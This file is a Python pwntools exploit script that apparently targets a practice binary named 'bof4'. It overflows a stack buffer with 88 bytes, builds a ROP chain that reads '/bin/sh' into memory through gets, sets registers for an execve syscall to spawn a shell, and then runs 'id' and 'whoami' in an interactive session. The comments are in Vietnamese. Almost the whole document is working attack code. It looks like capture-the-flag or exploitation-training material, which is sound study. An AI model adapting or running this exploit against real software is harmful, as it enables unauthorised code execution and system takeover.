#!/usr/bin/python3 

from pwn import *
elf=ELF('./bof4')
p=process(elf.path)

gdb.attach(p,'''b*0x00000000004011be''')
rw_section=0x406ea0
system=0x000000000040132e
pop_rdi=0x000000000040220e
# pop_rsi=0x00000000004015ae
pop_rsi_r15=0x000000000040220c
pop_rdx=0x00000000004043e4
pop_rax=0x0000000000401001
######################doc chuoi /bin/sh vao bo nho co the thuc thi
get_address=elf.sym['gets']
payload=b'A'*88
payload+=p64(pop_rdi)+p64(rw_section)
payload+=p64(get_address)
##############################thuc thi execve(/bin/sh,0,0)
payload+=p64(pop_rdi)+p64(rw_section)
payload+=p64(pop_rsi_r15)+p64(0)+p64(0)
# payload+=p64(pop_rdx)+p64(0)
# payload+=b'B'*0x28
payload+=p64(pop_rax)+p64(0x3b)
payload+=p64(system)
pause()
p.sendlineafter(b'something: ',payload)
p.sendline(b'/bin/sh')
p.sendline(b'id')
p.sendline(b'whoami')
# p.send(p64(system))
p.interactive()